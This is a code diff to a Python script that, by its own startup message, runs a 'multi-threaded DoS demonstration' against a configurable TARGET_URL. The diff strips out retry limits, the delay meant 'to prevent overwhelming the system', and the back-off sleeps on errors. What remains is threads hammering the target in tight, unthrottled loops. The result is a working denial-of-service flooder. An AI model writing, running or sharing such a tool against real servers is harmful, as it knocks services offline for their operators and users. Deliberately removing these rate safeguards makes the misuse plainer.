@@ -4,8 +4,6 @@ import threading
 import time
 import statistics
 import sys
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
 
 # Configure colored logging
 try:
@@ -43,49 +41,14 @@ response_times = []
 summary_interval = 10  # Show summary every N requests
 lock = threading.Lock()  # Lock for thread-safe operations on shared variables
 
-# Configure session with connection pooling
-def create_session():
-    session = requests.Session()
-    
-    # Configure retry strategy
-    retry_strategy = Retry(
-        total=3,
-        backoff_factor=0.1,
-        status_forcelist=[429, 500, 502, 503, 504],
-    )
-    
-    # Configure adapter with larger pool size and longer keep-alive
-    adapter = HTTPAdapter(
-        pool_connections=100,  # Increase connection pool size
-        pool_maxsize=100,      # Increase max size per host
-        max_retries=retry_strategy
-    )
-    
-    # Mount adapter to both http and https
-    session.mount("http://", adapter)
-    session.mount("https://", adapter)
-    
-    return session
-
-# Create thread-local storage for sessions
-thread_local = threading.local()
-
-def get_session():
-    if not hasattr(thread_local, "session"):
-        thread_local.session = create_session()
-    return thread_local.session
-
 def send_requests():
     global request_count
     global response_times
     
-    # Get thread-local session
-    session = get_session()
-    
     while True:
         try:
             start_time = time.time()
-            response = session.get(TARGET_URL)
+            response = requests.get(TARGET_URL)
             end_time = time.time()
             response_time = end_time - start_time
             
@@ -105,15 +68,10 @@ def send_requests():
                     if len(response_times) > 1000:
                         response_times = response_times[-100:]
 
-            # Add a small delay to prevent overwhelming the system
-            time.sleep(0.01)
-
         except requests.exceptions.RequestException as e:
             logger.error(f"Request error: {e}")
-            time.sleep(0.5)  # Back off on errors
         except Exception as e:
             logger.error(f"Unexpected error: {e}")
-            time.sleep(0.5)  # Back off on errors
 
 def main():
     print(f"Starting multi-threaded DoS demonstration against {TARGET_URL}")
